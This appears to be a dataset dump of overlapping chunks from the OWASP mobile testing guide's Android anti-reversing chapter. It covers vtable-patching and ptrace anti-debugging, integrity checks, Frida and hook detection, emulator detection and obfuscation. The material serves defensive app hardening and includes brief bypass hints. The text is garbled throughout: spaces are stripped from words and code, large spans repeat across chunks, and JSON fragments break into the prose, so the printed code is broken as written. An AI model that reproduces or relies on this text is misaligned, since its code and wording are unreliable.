Forexample,settingthegDvm.methDalvikDdmcServer_dispatchfunctionpointertoNULLcrashestheJDWPthread: JNIEXPORTjbooleanJNICALLJava_poc_c_crashOnInit (JNIEnv*env,jobject ){ gDvm.methDalvikDdmcServer_dispatch =NULL; } YoucandisabledebuggingbyusingsimilartechniquesinARTeventhoughthegDvmvariableisnotavailable. TheART runtime exports some of the vtables of JDWP-related classes as global symbols (in C++, vtables are tables that hold pointerstoclassmethods). ThisincludesthevtablesoftheclassesJdwpSocketStateandJdwpAdbState,whichhandle JDWPconnectionsvianetworksocketsandADB,respectively. Youcanmanipulatethebehaviorofthedebuggingruntime byoverwritingthemethodpointersintheassociatedvtables(archived). OnewaytooverwritethemethodpointersistooverwritetheaddressofthefunctionjdwpAdbState::ProcessIncoming withtheaddressofJdwpAdbState::Shutdown. Thiswillcausethedebuggertodisconnectimmediately. #include <jni.h> #include <string> #include <android/log.h> #include <dlfcn.h> #include <sys/mman.h> #include <jdwp/jdwp.h> #definelog(FMT,...) __android_log_print(ANDROID_LOG_VERBOSE,\"JDWPFun\",FMT,##__VA_ARGS__) //Vtablestructure.Justtomakemessingaroundwithitmoreintuitive struct VT_JdwpAdbState",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 113
    }
  },
  {
    "text": "){ gDvm.methDalvikDdmcServer_dispatch =NULL; } YoucandisabledebuggingbyusingsimilartechniquesinARTeventhoughthegDvmvariableisnotavailable. TheART runtime exports some of the vtables of JDWP-related classes as global symbols (in C++, vtables are tables that hold pointerstoclassmethods). ThisincludesthevtablesoftheclassesJdwpSocketStateandJdwpAdbState,whichhandle JDWPconnectionsvianetworksocketsandADB,respectively. Youcanmanipulatethebehaviorofthedebuggingruntime byoverwritingthemethodpointersintheassociatedvtables(archived). OnewaytooverwritethemethodpointersistooverwritetheaddressofthefunctionjdwpAdbState::ProcessIncoming withtheaddressofJdwpAdbState::Shutdown. Thiswillcausethedebuggertodisconnectimmediately. #include <jni.h> #include <string> #include <android/log.h> #include <dlfcn.h> #include <sys/mman.h> #include <jdwp/jdwp.h> #definelog(FMT,...) __android_log_print(ANDROID_LOG_VERBOSE,\"JDWPFun\",FMT,##__VA_ARGS__) //Vtablestructure.Justtomakemessingaroundwithitmoreintuitive struct VT_JdwpAdbState { unsigned long x; unsigned long y; void *JdwpSocketState_destructor; void *_JdwpSocketState_destructor; void *Accept; void *showmanyc; void *ShutDown; void *ProcessIncoming; }; extern \"C\" JNIEXPORT void JNICALLJava_sg_vantagepoint_jdwptest_MainActivity_JDWPfun( JNIEnv *env, jobject /*this*/){ void*lib=dlopen(\"libart.so\",RTLD_NOW); if(lib==NULL){ log(\"Errorloadinglibart.so\"); dlerror(); }else{ struct VT_JdwpAdbState *vtable =(struct VT_JdwpAdbState *)dlsym(lib,\"_ZTVN3art4JDWP12JdwpAdbStateE\"); if(vtable ==0){ log(\"Couldn'tresolvesymbol'_ZTVN3art4JDWP12JdwpAdbStateE'.\\n\"); }else { log(\"VtableforJdwpAdbStateat: %08x\\n\",vtable); //Letthefunbegin! unsigned long pagesize =sysconf(_SC_PAGE_SIZE); 306\\nunsigned long page =(unsigned long)vtable & ~(pagesize-1); mprotect((void *)page,pagesize,PROT_READ |PROT_WRITE); vtable->ProcessIncoming =vtable->ShutDown; //Resetpermissions&flushcache mprotect((void *)page,pagesize,PROT_READ); } } } Traditional Anti-Debugging OnLinux,theptracesystemcallisusedtoobserveandcontroltheexecutionofaprocess(thetracee)andtoexamineand changethatprocess’memoryandregisters. ptraceistheprimarywaytoimplementsystemcalltracingandbreakpoint debugging in native code. Most JDWP anti-debugging tricks (which may be safe for timer-based checks) won’t catch classicaldebuggersbasedonptraceandtherefore,manyAndroidanti-debuggingtricksincludeptrace,oftenexploiting thefactthatonlyonedebuggeratatimecanattachtoaprocess. Checking TracerPid When you debug an app and set a breakpoint on native code, Android Studio will copy the needed files to the target deviceandstartthelldb-serverwhichwilluseptracetoattachtotheprocess. Fromthismomenton,ifyouinspectthe statusfileofthedebuggedprocess(/proc/<pid>/statusor/proc/self/status),youwillseethatthe“TracerPid”field hasavaluedifferentfrom0,whichisasignofdebugging. Remember that this only applies to native code. If you’re debugging a Java/Kotlin-only app the value of the “TracerPid”fieldshouldbe0. ThistechniqueisusuallyappliedwithintheJNInativelibrariesinC,asshowninGoogle’sgperftools(GooglePerformance Tools))HeapCheckerimplementationoftheIsDebuggerAttachedmethod. However,ifyouprefertoincludethischeckas partofyourJava/KotlincodeyoucanrefertothisJavaimplementationofthehasTracerPidmethodfromTimStrazzere’s Anti-Emulatorproject. Whentryingtoimplementsuchamethodyourself,youcanmanuallycheckthevalueofTracerPidwithADB.Thefollow- inglistingusesGoogle’sNDKsampleapphello-jni(com.example.hellojni)toperformthecheckafterattachingAndroid Studio’sdebugger: $adbshellps -A|grep com.example.hellojni u0_a271 11657 5734302108 50600ptrace_stop 0tcom.example.hellojni $adbshellcat/proc/11657/status |grep -e\"^TracerPid:\" |sed\"s/^TracerPid:\\t//\" TracerPid: 11839 $adbshellps -A|grep 11839 u0_a271 1183911837 14024 4548poll_schedule_timeout0Slldb-server Youcanseehowthestatusfileofcom.example.hellojni(PID=11657)containsaTracerPIDof11839,whichwecanidentify asthelldb-serverprocess. Using Fork and ptrace Youcanpreventdebuggingofaprocessbyforkingachildprocessandattachingittotheparentasadebuggerviacode similartothefollowingsimpleexamplecode: void fork_and_attach() { intpid=fork(); if(pid==0) { intppid =getppid(); if(ptrace(PTRACE_ATTACH,ppid,NULL,NULL)==0) { waitpid(ppid,NULL,0); 307\\n/*Continuetheparentprocess*/ ptrace(PTRACE_CONT,NULL,NULL); } } } Withthechildattached,furtherattemptstoattachtotheparentwillfail. Wecanverifythisbycompilingthecodeintoa JNIfunctionandpackingitintoanappwerunonthedevice. root@android:/ #ps|grep-ianti u0_a151 18190201 153584454908ffffffffb6e0f124Ssg.vantagepoint.antidebug u0_a151 1822418190149518035824c019a3acb6e0ee5cSsg.vantagepoint.antidebug Attemptingtoattachtotheparentprocesswithgdbserverfailswithanerror: root@android:/ #./gdbserver--attachlocalhost:1234518190 warning:process18190isalreadytracedbyprocess18224 Cannotattachtolwp18190:Operationnotpermitted (1) Exiting Youcaneasilybypassthisfailure,however,bykillingthechildand“freeing”theparentfrombeingtraced. You’lltherefore usually find more elaborate schemes, involving multiple processes and threads as well as some form of monitoring to impedetampering. Commonmethodsinclude • forkingmultipleprocessesthattraceoneanother, • keepingtrackofrunningprocessestomakesurethechildrenstayalive, • monitoringvaluesinthe/procfilesystem,suchasTracerPIDin/proc/pid/status. Let’slookatasimpleimprovementforthemethodabove. Aftertheinitialfork,welaunchintheparentanextrathread that continually monitors the child’s status. Depending on whether the app has been built in debug or release mode (which is indicated by the android:debuggable flag in the manifest), the child process should do one of the following things: • In release mode: The call to ptrace fails and the child crashes immediately with a segmentation fault (exit code 11). • In debug mode: The call to ptrace works and the child should run indefinitely. Consequently, a call to wait- pid(child_pid)shouldneverreturn. Ifitdoes,somethingisfishyandwewouldkillthewholeprocessgroup. ThefollowingisthecompletecodeforimplementingthisimprovementwithaJNIfunction: #include <jni.h> #include <unistd.h> #include <sys/ptrace.h> #include <sys/wait.h> #include <pthread.h> static intchild_pid; void *monitor_pid(){ intstatus; waitpid(child_pid,&status,0); /*Childstatusshouldneverchange.*/ _exit(0);//Commitseppuku } void anti_debug(){ child_pid =fork(); if(child_pid ==0) { intppid =getppid(); intstatus; if(ptrace(PTRACE_ATTACH,ppid,NULL,NULL)==0) { waitpid(ppid,&status,0); ptrace(PTRACE_CONT,ppid,NULL,NULL); 308\\nwhile (waitpid(ppid,&status,0)){ if(WIFSTOPPED(status)){ ptrace(PTRACE_CONT,ppid,NULL,NULL); }else { //Processhasexited _exit(0); } } } }else { pthread_tt; /*Startthemonitoringthread*/ pthread_create(&t,NULL,monitor_pid,(void *)NULL); } } JNIEXPORT void JNICALL Java_sg_vantagepoint_antidebug_MainActivity_antidebug(JNIEnv *env,jobjectinstance){ anti_debug(); } Again,wepackthisintoanAndroidapptoseeifitworks. Justasbefore,twoprocessesshowupwhenweruntheapp’s debugbuild. root@android:/ #ps|grep-Ianti-debug u0_a152 20267201 155250856796ffffffffb6e0f124Ssg.vantagepoint.anti-debug u0_a152 2030120267149519233980c019a3acb6e0ee5cSsg.vantagepoint.anti-debug However,ifweterminatethechildprocessatthispoint,theparentexitsaswell: root@android:/ #kill-920301 130|root@hammerhead:/ #cd/data/local/tmp root@android:/ #./gdbserver--attachlocalhost:1234520267 gdbserver:unabletoopen/procfile '/proc/20267/status' Cannotattachtolwp20267:Nosuchfileordirectory (2) Exiting Tobypassthis,wemustmodifytheapp’sbehaviorslightly(theeasiestwaystodosoarepatchingthecallto_exitwith NOPsandhookingthefunction_exitinlibc.so). Atthispoint,wehaveenteredtheproverbial“armsrace”: implement- ingmoreintricateformsofthisdefenseaswellasbypassingitarealwayspossible. File Integrity Checks Therearetwotopicsrelatedtofileintegrity: 1. Codeintegritychecks: Inthe“TamperingandReverseEngineeringonAndroid”chapter,wediscussedAndroid’sAPK codesignaturecheck. Wealsosawthatdeterminedreverseengineerscaneasilybypassthischeckbyre-packaging andre-signinganapp. Tomakethisbypassingprocessmoreinvolved,aprotectionschemecanbeaugmentedwith CRCchecksontheappbytecode,nativelibraries,andimportantdatafiles. Thesecheckscanbeimplementedon boththeJavaandthenativelayer. Theideaistohaveadditionalcontrolsinplacesothattheapponlyrunscorrectly initsunmodifiedstate,evenifthecodesignatureisvalid. 2. Thefilestorageintegritychecks: TheintegrityoffilesthattheapplicationstoresontheSDcardorpublicstorage andtheintegrityofkey-valuepairsthatarestoredinSharedPreferencesshouldbeprotected. Sample Implementation - Application Source Code Integritychecksoftencalculateachecksumorhashoverselectedfiles. Commonlyprotectedfilesinclude • AndroidManifest.xml, • classfiles*.dex, • nativelibraries(*.so). 309\\nThefollowingsampleimplementationfromtheAndroidCrackingblogcalculatesaCRCoverclasses.dexandcompares ittotheexpectedvalue. private void crcTest()throws IOException",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 114
    }
  },
  {
    "text": "gdbserver:unabletoopen/procfile '/proc/20267/status' Cannotattachtolwp20267:Nosuchfileordirectory (2) Exiting Tobypassthis,wemustmodifytheapp’sbehaviorslightly(theeasiestwaystodosoarepatchingthecallto_exitwith NOPsandhookingthefunction_exitinlibc.so). Atthispoint,wehaveenteredtheproverbial“armsrace”: implement- ingmoreintricateformsofthisdefenseaswellasbypassingitarealwayspossible. File Integrity Checks Therearetwotopicsrelatedtofileintegrity: 1. Codeintegritychecks: Inthe“TamperingandReverseEngineeringonAndroid”chapter,wediscussedAndroid’sAPK codesignaturecheck. Wealsosawthatdeterminedreverseengineerscaneasilybypassthischeckbyre-packaging andre-signinganapp. Tomakethisbypassingprocessmoreinvolved,aprotectionschemecanbeaugmentedwith CRCchecksontheappbytecode,nativelibraries,andimportantdatafiles. Thesecheckscanbeimplementedon boththeJavaandthenativelayer. Theideaistohaveadditionalcontrolsinplacesothattheapponlyrunscorrectly initsunmodifiedstate,evenifthecodesignatureisvalid. 2. Thefilestorageintegritychecks: TheintegrityoffilesthattheapplicationstoresontheSDcardorpublicstorage andtheintegrityofkey-valuepairsthatarestoredinSharedPreferencesshouldbeprotected. Sample Implementation - Application Source Code Integritychecksoftencalculateachecksumorhashoverselectedfiles. Commonlyprotectedfilesinclude • AndroidManifest.xml, • classfiles*.dex, • nativelibraries(*.so). 309\\nThefollowingsampleimplementationfromtheAndroidCrackingblogcalculatesaCRCoverclasses.dexandcompares ittotheexpectedvalue. private void crcTest()throws IOException { boolean modified =false; //requireddexcrcvaluestoredasatextstring. //itcouldbeanyinvisiblelayoutelement long dexCrc =Long.parseLong(Main.MyContext.getString(R.string.dex_crc)); ZipFilezf =newZipFile(Main.MyContext.getPackageCodePath()); ZipEntryze =zf.getEntry(\"classes.dex\"); if(ze.getCrc()!=dexCrc ){ //dexhasbeenmodified modified =true; } else { //dexnottamperedwith modified =false; } } Sample Implementation - Storage When providing integrity on the storage itself, you can either create an HMAC over a given key-value pair (as for the AndroidSharedPreferences)orcreateanHMACoveracompletefilethat’sprovidedbythefilesystem. WhenusinganHMAC,youcanuseabouncycastleimplementationortheAndroidKeyStoretoHMACthegivencontent. CompletethefollowingprocedurewhengeneratinganHMACwithBouncyCastle: 1. MakesureBouncyCastleorSpongyCastleisregisteredasasecurityprovider. 2. InitializetheHMACwithakey(whichcanbestoredinakeystore). 3. GetthebytearrayofthecontentthatneedsanHMAC. 4. CalldoFinalontheHMACwiththebytecode. 5. AppendtheHMACtothebytearrayobtainedinstep3. 6. Storetheresultofstep5. CompletethefollowingprocedurewhenverifyingtheHMACwithBouncyCastle: 1. MakesurethatBouncyCastleorSpongyCastleisregisteredasasecurityprovider. 2. ExtractthemessageandtheHMAC-bytesasseparatearrays. 3. Repeatsteps1-4oftheprocedureforgeneratinganHMAC. 4. ComparetheextractedHMAC-bytestotheresultofstep3. WhengeneratingtheHMACbasedontheAndroidKeystore, thenitisbesttoonlydothisforAndroid6.0(APIlevel23) andhigher. ThefollowingisaconvenientHMACimplementationwithoutAndroidKeyStore: public enum HMACWrapper { HMAC_512(\"HMac-SHA512\"),//pleasenotethatthisisthespecfortheBCprovider HMAC_256(\"HMac-SHA256\"); private final Stringalgorithm; private HMACWrapper(final Stringalgorithm){ this.algorithm =algorithm; } public MaccreateHMAC(final SecretKeykey){ try{ Mace =Mac.getInstance(this.algorithm,\"BC\"); SecretKeySpecsecret =newSecretKeySpec(key.getKey().getEncoded(), this.algorithm); e.init(secret); return e; }catch (NoSuchProviderException |InvalidKeyException |NoSuchAlgorithmExceptione){ //handlethem } } public byte[]hmac(byte[]message,SecretKeykey){ Macmac =this.createHMAC(key); return mac.doFinal(message); } public boolean verify(byte[]messageWithHMAC,SecretKeykey){ 310\\nMacmac =this.createHMAC(key); byte[]checksum =extractChecksum(messageWithHMAC,mac.getMacLength()); byte[]message =extractMessage(messageWithHMAC,mac.getMacLength()); byte[]calculatedChecksum =this.hmac(message,key); intdiff =checksum.length ^calculatedChecksum.length; for(inti=0;i<checksum.length && i<calculatedChecksum.length;++i){ diff |=checksum[i]^calculatedChecksum[i]; } return diff ==0; } public byte[]extractMessage(byte[]messageWithHMAC){ Machmac =this.createHMAC(SecretKey.newKey()); return extractMessage(messageWithHMAC,hmac.getMacLength()); } private static byte[]extractMessage(byte[]body,intchecksumLength){ if(body.length >=checksumLength){ byte[]message =newbyte[body.length -checksumLength]; System.arraycopy(body,0,message,0,message.length); return message; }else { return newbyte[0]; } } private static byte[]extractChecksum(byte[]body,intchecksumLength){ if(body.length >=checksumLength){ byte[]checksum =newbyte[checksumLength]; System.arraycopy(body,body.length -checksumLength,checksum,0, checksumLength); return checksum; }else { return newbyte[0]; } } static { Security.addProvider(newBouncyCastleProvider()); } } Anotherwaytoprovideintegrityistosignthebytearrayyouobtainedandaddthesignaturetotheoriginalbytearray. Detection of Reverse Engineering Tools Thepresenceoftools, frameworksandappscommonlyusedbyreverseengineersmayindicateanattempttoreverse engineertheapp. Someofthesetoolscanonlyrunonarooteddevice,whileothersforcetheappintodebuggingmode ordependonstartingabackgroundserviceonthemobilephone. Therefore, therearedifferentwaysthatanappmay implementtodetectareverseengineeringattackandreacttoit,e.g.byterminatingitself. Youcandetectpopularreverseengineeringtoolsthathavebeeninstalledinanunmodifiedformbylookingforassociated applicationpackages,files,processes,orothertool-specificmodificationsandartifacts. Inthefollowingexamples,we’ll discussdifferentwaystodetecttheFridainstrumentationframework,whichisusedextensivelyinthisguide. Othertools, such as Substrate and Xposed, can be detected similarly. Note that DBI/injection/hooking tools can often be detected implicitly,throughruntimeintegritychecks,whicharediscussedbelow. Forinstance,initsdefaultconfigurationonarooteddevice,Fridarunsonthedeviceasfrida-server. Whenyouexplicitly attach to a target app (e.g. via frida-trace or the Frida REPL), Frida injects a frida-agent into the memory of the app. Therefore, youmayexpecttofinditthereafterattachingtotheapp(andnotbefore). Ifyoucheck/proc/<pid>/maps you’llfindthefrida-agentasfrida-agent-64.so: bullhead:/ #cat/proc/18370/maps|grep-ifrida 71b6bd6000-71b7d62000r-xp /data/local/tmp/re.frida.server/frida-agent-64.so 71b7d7f000-71b7e06000r--p /data/local/tmp/re.frida.server/frida-agent-64.so 71b7e06000-71b7e28000rw-p /data/local/tmp/re.frida.server/frida-agent-64.so Theothermethod(whichalsoworksfornon-rooteddevices)consistsofembeddingafrida-gadgetintotheAPKandforcing theapptoloaditasoneofitsnativelibraries. Ifyouinspecttheappmemorymapsafterstartingtheapp(noneedto attachexplicitlytoit)you’llfindtheembeddedfrida-gadgetaslibfrida-gadget.so. 311\\nbullhead:/ #cat/proc/18370/maps|grep-ifrida 71b865a000-71b97f1000r-xp /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so 71b9802000-71b988a000r--p /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so 71b988a000-71b98ac000rw-p /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so LookingatthesetwotracesthatFridaleftsbehind,youmightalreadyimaginethatdetectingthosewouldbeatrivialtask. Andactually,sotrivialwillbebypassingthatdetection. Butthingscangetmuchmorecomplicated. Thefollowingtable shortlypresentsasetofsometypicalFridadetectionmethodsandashortdiscussionontheireffectiveness. Someofthefollowingdetectionmethodsarepresentedinthearticle“TheJiu-JitsuofDetectingFrida”byBerdhard Mueller(archived). Pleaserefertoitformoredetailsandforexamplecodesnippets. Method Description Discussion CheckingtheAppSignature Inordertoembedthefrida-gadget Thisisunfortunatelytootrivialto withintheAPK,itwouldneedtobe bypass,e.g.bypatchingtheAPKor repackagedandresigned. Youcould performingsystemcallhooking. checkthesignatureoftheAPKwhen theappisstarting (e.g.GET_SIGNING_CERTIFICATES sinceAPIlevel28)andcompareitto theoneyoupinnedinyourAPK. CheckTheEnvironmentFor Artifactscanbepackagefiles, SinceAndroid7.0(APIlevel24), RelatedArtifacts binaries,libraries,processes,and inspectingtherunning temporaryfiles. ForFrida,thiscould services/processeswon’tshowyou bethefrida-serverrunninginthe daemonslikethefrida-serverasitis target(rooted)system(thedaemon notbeingstartedbytheappitself. responsibleforexposingFridaover Evenifitwouldbepossible, TCP).Inspecttherunningservices bypassingthiswouldbeaseasyjust (getRunningServices)andprocesses renamingthecorrespondingFrida (ps)searchingforonewhosenameis artifact(frida-server/frida- “frida-server”. Youcouldalsowalk gadget/frida-agent). throughthelistofloadedlibrariesand checkforsuspiciousones(e.g.those including“frida”intheirnames). CheckingForOpenTCPPorts Thefrida-serverprocessbindstoTCP Thismethoddetectsfrida-serverinits port27042bydefault. Checkwhether defaultmode,butthelisteningport thisportisopenisanothermethodof canbechangedviaacommandline detectingthedaemon. argument,sobypassingthisisalittle tootrivial. CheckingForPortsResponding frida-serverusestheD-Bus Thisisafairlyrobustmethodof ToD-BusAuth protocoltocommunicate,soyoucan detectingfrida-server,butFrida expectittorespondtoD-BusAUTH. offersalternativemodesofoperation SendaD-BusAUTHmessagetoevery thatdon’trequirefrida-server. openportandcheckforananswer, hopingthatfrida-serverwillreveal itself. 312\\nMethod Description Discussion ScanningProcessMemoryfor Scanthememoryforartifactsfound Thismethodisabitmoreeffective, KnownArtifacts inFrida’slibraries,e.g.thestring anditisdifficulttobypasswithFrida “LIBFRIDA”presentinallversionsof only,especiallyifsomeobfuscation frida-gadgetandfrida-agent. For hasbeenaddedandifmultiple example,use artifactsarebeingscanned. However, Runtime.getRuntime().execand thechosenartifactsmightbepatched iteratethroughthememory intheFridabinaries. Findthesource mappingslistedin/proc/self/maps codeonBerdhardMueller’sGitHub. or/proc/<pid>/maps(dependingon theAndroidversion)searchingforthe string. Pleaserememberthatthistableisfarfromexhaustive. Wecouldstarttalkingaboutnamedpipes(usedbyfrida-server forexternalcommunication),detectingtrampolines(indirectjumpvectorsinsertedattheprologueoffunctions),which wouldhelpdetectingSubstrateorFrida’sInterceptorbut,forexample,won’tbeeffectiveagainstFrida’sStalker;andmany other,moreorless,effectivedetectionmethods. Eachofthemwilldependonwhetheryou’reusingarooteddevice,the specific version of the rooting method and/or the version of the tool itself. Further, the app can try to make it harder to detect the implemented protection mechanisms by using various obfuscation techniques. At the end, this is part of thecatandmousegameofprotectingdatabeingprocessedonanuntrustedenvironment(anapprunningintheuser device). Itisimportanttonotethatthesecontrolsareonlyincreasingthecomplexityofthereverseengineeringprocess. If used, the best approachis to combine the controlscleverly instead of using them individually. However, none of themcanassurea100%effectiveness,asthereverseengineerwillalwayshavefullaccesstothedeviceandwill thereforealwayswin! Youalsohavetoconsiderthatintegratingsomeofthecontrolsintoyourappmightincrease thecomplexityofyourappandevenhaveanimpactonitsperformance. Emulator Detection",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 115
    }
  },
  {
    "text": "can try to make it harder to detect the implemented protection mechanisms by using various obfuscation techniques. At the end, this is part of thecatandmousegameofprotectingdatabeingprocessedonanuntrustedenvironment(anapprunningintheuser device). Itisimportanttonotethatthesecontrolsareonlyincreasingthecomplexityofthereverseengineeringprocess. If used, the best approachis to combine the controlscleverly instead of using them individually. However, none of themcanassurea100%effectiveness,asthereverseengineerwillalwayshavefullaccesstothedeviceandwill thereforealwayswin! Youalsohavetoconsiderthatintegratingsomeofthecontrolsintoyourappmightincrease thecomplexityofyourappandevenhaveanimpactonitsperformance. Emulator Detection In the context of anti-reversing, the goal of emulator detection is to increase the difficulty of running the app on an emulateddevice,whichimpedessometoolsandtechniquesreverseengineersliketouse. Thisincreaseddifficultyforces thereverseengineertodefeattheemulatorchecksorutilizethephysicaldevice,therebybarringtheaccessrequiredfor large-scaledeviceanalysis. There are several indicators that the device in question is being emulated. Although all these API calls can be hooked, theseindicatorsprovideamodestfirstlineofdefense. Thefirstsetofindicatorsareinthefilebuild.prop. APIMethod Value Meaning Build.ABI armeabi possiblyemulator BUILD.ABI2 unknown possiblyemulator Build.BOARD unknown emulator Build.Brand generic emulator Build.DEVICE generic emulator Build.FINGERPRINT generic emulator Build.Hardware goldfish emulator Build.Host android-test possiblyemulator Build.ID FRF91 emulator Build.MANUFACTURER unknown emulator Build.MODEL sdk emulator Build.PRODUCT sdk emulator Build.RADIO unknown possiblyemulator Build.SERIAL null emulator Build.USER android-build emulator Youcaneditthefilebuild.proponarootedAndroiddeviceormodifyitwhilecompilingAOSPfromsource. Bothtechniques willallowyoutobypassthestaticstringchecksabove. ThenextsetofstaticindicatorsutilizetheTelephonymanager. AllAndroidemulatorshavefixedvaluesthatthisAPIcan query. 313\\nAPI Value Meaning TelephonyManager.getDeviceId() 0's emulator TelephonyManager.getLine1Number() 155552155 emulator TelephonyManager.getNetworkCountryIso() us possiblyemulator TelephonyManager.getNetworkType() 3 possiblyemulator TelephonyManager.getNetworkOperator().substring(0,3) 310 possiblyemulator TelephonyManager.getNetworkOperator().substring(3) 260 possiblyemulator TelephonyManager.getPhoneType() 1 possiblyemulator TelephonyManager.getSimCountryIso() us possiblyemulator TelephonyManager.getSimSerialNumber() 89014103211118510720 emulator TelephonyManager.getSubscriberId() 310260000000000 emulator TelephonyManager.getVoiceMailNumber() 15552175049 emulator Keepinmindthatahookingframework,suchasXposedorFrida,canhookthisAPItoprovidefalsedata. Runtime Integrity Verification Controlsinthiscategoryverifytheintegrityoftheapp’smemoryspacetodefendtheappagainstmemorypatchesapplied duringruntime. Suchpatchesincludeunwantedchangestobinarycode,bytecode,functionpointertables,andimportant datastructures,aswellasroguecodeloadedintoprocessmemory. Integritycanbeverifiedby: 1. comparingthecontentsofmemoryorachecksumoverthecontentstogoodvalues, 2. searchingmemoryforthesignaturesofunwantedmodifications. There’ssomeoverlapwiththecategory“detectingreverseengineeringtoolsandframeworks”,and,infact,wedemon- stratedthesignature-basedapproachinthatchapterwhenweshowedhowtosearchprocessmemoryforFrida-related strings. Belowareafewmoreexamplesofvariouskindsofintegritymonitoring. Detecting Tampering with the Java Runtime Thisdetectioncodeisfromthedead&&endblog. try{ throw newException(); } catch(Exceptione){ intzygoteInitCallCount =0; for(StackTraceElementstackTraceElement :e.getStackTrace()){ if(stackTraceElement.getClassName().equals(\"com.android.internal.os.ZygoteInit\")){ zygoteInitCallCount++; if(zygoteInitCallCount ==2){ Log.wtf(\"HookDetection\",\"Substrateisactiveonthedevice.\"); } } if(stackTraceElement.getClassName().equals(\"com.saurik.substrate.MS$2\")&& stackTraceElement.getMethodName().equals(\"invoked\")){ Log.wtf(\"HookDetection\",\"AmethodonthestacktracehasbeenhookedusingSubstrate.\"); } if(stackTraceElement.getClassName().equals(\"de.robv.android.xposed.XposedBridge\")&& stackTraceElement.getMethodName().equals(\"main\")){ Log.wtf(\"HookDetection\",\"Xposedisactiveonthedevice.\"); } if(stackTraceElement.getClassName().equals(\"de.robv.android.xposed.XposedBridge\")&& stackTraceElement.getMethodName().equals(\"handleHookedMethod\")){ Log.wtf(\"HookDetection\",\"AmethodonthestacktracehasbeenhookedusingXposed.\"); } } } Detecting Native Hooks By using ELF binaries, native function hooks can be installed by overwriting function pointers in memory (e.g., Global Offset Table or PLT hooking) or patching parts of the function code itself (inline hooking). Checking the integrity of the respectivememoryregionsisonewaytodetectthiskindofhook. TheGlobalOffsetTable(GOT)isusedtoresolvelibraryfunctions. Duringruntime,thedynamiclinkerpatchesthistable withtheabsoluteaddressesofglobalsymbols. GOThooksoverwritethestoredfunctionaddressesandredirectlegitimate functioncallstoadversary-controlledcode. Thistypeofhookcanbedetectedbyenumeratingtheprocessmemorymap andverifyingthateachGOTentrypointstoalegitimatelyloadedlibrary. 314\\nIncontrasttoGNUld,whichresolvessymboladdressesonlyaftertheyareneededforthefirsttime(lazybinding),the AndroidlinkerresolvesallexternalfunctionsandwritestherespectiveGOTentriesimmediatelyafteralibraryisloaded (immediatebinding). YoucanthereforeexpectallGOTentriestopointtovalidmemorylocationsinthecodesectionsof theirrespectivelibrariesduringruntime. GOThookdetectionmethodsusuallywalktheGOTandverifythis. Inline hooks work by overwriting a few instructions at the beginning or end of the function code. During runtime, this so-called trampoline redirects execution to the injected code. You can detect inline hooks by inspecting the prologues andepiloguesoflibraryfunctionsforsuspectinstructions,suchasfarjumpstolocationsoutsidethelibrary. Obfuscation Thechapter“MobileAppTamperingandReverseEngineering”introducesseveralwell-knownobfuscationtechniquesthat canbeusedinmobileappsingeneral. Androidappscanimplementsomeofthoseobfuscationtechniquesusingdifferenttooling. Forexample,ProGuardoffers an easy way to shrink and obfuscate code and to strip unneeded debugging information from the bytecode of Android Javaapps. Itreplacesidentifiers,suchasclassnames,methodnames,andvariablenames,withmeaninglesscharacter strings. Thisisatypeoflayoutobfuscation,whichdoesn’timpacttheprogram’sperformance. DecompilingJavaclassesistrivial,thereforeitisrecommendedtoalwaysapplyingsomebasicobfuscationtothe productionbytecode. LearnmoreaboutAndroidobfuscationtechniques: • “SecurityHardeningofAndroidNativeCode”byGautamArvind • “APKiD:FastIdentificationofAppShieldingProducts”byEduardoNovella • “ChallengesofNativeAndroidApplications: ObfuscationandVulnerabilities”byPierreGraux Using ProGuard Developersusethebuild.gradlefiletoenableobfuscation. Intheexamplebelow,youcanseethatminifyEnabledand proguardFilesareset. Creatingexceptionstoprotectsomeclassesfromobfuscation(with-keepclassmembersand- keepclass)iscommon. Therefore,auditingtheProGuardconfigurationfiletoseewhatclassesareexemptedisimportant. ThegetDefaultProguardFile('proguard-android.txt')methodgetsthedefaultProGuardsettingsfromthe<Android SDK>/tools/proguard/folder. Furtherinformationonhowtoshrink,obfuscate,andoptimizeyourappcanbefoundintheAndroiddeveloperdocumen- tation. WhenyoubuildyourprojectusingAndroidStudio3.4orAndroidGradleplugin3.4.0orhigher,thepluginnolonger usesProGuardtoperformcompile-timecodeoptimization. Instead,thepluginusestheR8compiler. R8workswith allofyourexistingProGuardrulesfiles,soupdatingtheAndroidGradleplugintouseR8shouldnotrequireyouto changeyourexistingrules. R8isthenewcodeshrinkerfromGoogleandwasintroducedinAndroidStudio3.3beta. Bydefault,R8removesattributes thatareusefulfordebugging,includinglinenumbers,sourcefilenames,andvariablenames. R8isafreeJavaclassfile shrinker,optimizer,obfuscator,andpre-verifierandisfasterthanProGuard,seealsoanAndroidDeveloperblogpostfor further details. It is shipped with Android’s SDK tools. To activate shrinking for the release build, add the following to build.gradle: android{ buildTypes{ release{ //Enablescodeshrinking,obfuscation,andoptimizationforonly //yourproject'sreleasebuildtype. minifyEnabledtrue //IncludesthedefaultProGuardrulesfilesthatarepackagedwith //theAndroidGradleplugin.Tolearnmore,gotothesectionabout //R8configurationfiles. proguardFilesgetDefaultProguardFile( 'proguard-android-optimize.txt'), 'proguard-rules.pro' } 315\\n} ... } Thefileproguard-rules.proiswhereyoudefinecustomProGuardrules. Withtheflag-keepyoucankeepcertaincode thatisnotbeingremovedbyR8,whichmightotherwiseproduceerrors. ForexampletokeepcommonAndroidclasses, asinoursampleconfigurationproguard-rules.profile: ... -keeppublicclass*extendsandroid.app.Activity -keeppublicclass*extendsandroid.app.Application -keeppublicclass*extendsandroid.app.Service ... Youcandefinethismoregranularlyonspecificclassesorlibrariesinyourprojectwiththefollowingsyntax: -keeppublicclassMyClass Obfuscationoftencarriesacostinruntimeperformance,thereforeitisusuallyonlyappliedtocertainveryspecificparts ofthecode,typicallythosedealingwithsecurityandruntimeprotection. Device Binding ThegoalofdevicebindingistoimpedeanattackerwhotriestobothcopyanappanditsstatefromdeviceAtodeviceB andcontinueexecutingtheappondeviceB.AfterdeviceAhasbeendeterminedtrustworthy,itmayhavemoreprivileges thandeviceB.ThesedifferentialprivilegesshouldnotchangewhenanappiscopiedfromdeviceAtodeviceB. 